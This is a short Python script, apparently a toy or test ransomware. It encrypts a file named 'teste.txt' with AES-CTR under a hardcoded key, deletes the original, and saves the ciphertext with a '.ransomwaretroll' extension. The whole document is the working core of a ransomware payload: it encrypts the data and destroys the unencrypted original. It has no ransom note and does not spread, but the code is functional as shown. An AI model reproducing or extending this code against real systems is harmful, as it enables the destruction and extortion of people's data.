import os
import pyaes

def encrypt_file(file_name, key):
    with open(file_name, 'rb') as file:
        plaintext = file.read()

    aes = pyaes.AESModeOfOperationCTR(key)
    ciphertext = aes.encrypt(plaintext)

    os.remove(file_name)

    new_file_name = file_name + ".ransomwaretroll"
    with open(new_file_name, 'wb') as new_file:
        new_file.write(ciphertext)


key = b"testeransomwares"
file_name = "teste.txt"


encrypt_file(file_name, key)